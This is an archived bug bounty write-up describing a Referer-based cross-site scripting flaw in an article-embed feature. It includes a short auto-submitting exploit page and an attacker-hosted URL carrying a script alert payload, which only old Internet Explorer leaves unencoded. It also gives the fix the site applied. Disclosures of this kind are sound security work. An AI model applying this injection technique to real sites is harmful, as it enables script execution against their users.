---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-30_referer-based-xss.md
original_filename: 2017-07-30_referer-based-xss.md
title: Referer Based XSS
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 9bbf9e58eaa18d5adc0033df5a9f0714234009c54c0eaaaf766e19ff9bec2793
text_sha256: 3fa74ab4e705feac541386bb2ce1d3c6a9ad7f880ebd2a08321cb2126b241252
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Referer Based XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-30_referer-based-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `9bbf9e58eaa18d5adc0033df5a9f0714234009c54c0eaaaf766e19ff9bec2793`
- Text SHA256: `3fa74ab4e705feac541386bb2ce1d3c6a9ad7f880ebd2a08321cb2126b241252`


## Content

---
title: "Referer Based XSS"
url: "https://medium.com/@arbazhussain/referer-based-xss-52aeff7b09e7"
authors: ["Arbaz Hussain (@ArbazKiraak)"]
bugs: ["XSS"]
publication_date: "2017-07-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6135
scraped_via: "browseros"
---

# Referer Based XSS

Referer Based XSS
Arbaz Hussain
Follow
2 min read
·
Jul 30, 2017

220

2

Severity : Medium

Complexity : High( Exploitable with old version of IE)

Get Arbaz Hussain’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Weakness: Using Referer value is response body

While Testing one of the private on Hackerone . They have functionality to Embed the articles of their user’s on third party site’s.
While opening the article’s from third party site’s , Noticed that they have a href called “GO BACK! If it Doesn’t Load’s”
Press enter or click to view image in full size
Checking the go back href :
<a href="http://54.147.92.2/test.html">go back</a>
and try again. If this problem persists, please 
<a href="/contact">contact us</a>
Exploit.html
<script>document.getElementById(’xx’).submit()</script>
<form id=’xx’ name=’exploit’ method=”GET” action="https://site.com/articles/author/embed/112434/"></form>
When we sent http://54.147.92.2/exploit.html?<script>alert(1);</script> to the victim.
Referer value get’s set to http://54.147.92.2/exploit.html?<script>alert(1);</script> and by clicking on “GO BACK!” Popup will appear in IE.
Reason why attack work’s only on IE is Internet Explorer doesn’t filter URL Encode values . Whereas Chrome and Firefox will URL encode the values to
http://54.147.92.2/exploit.html?%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
Press enter or click to view image in full size
I would like to thank following blog post http://www.gremwell.com/exploiting_xss_in_referer_header
They have Fixed By using javascript:history.back() :
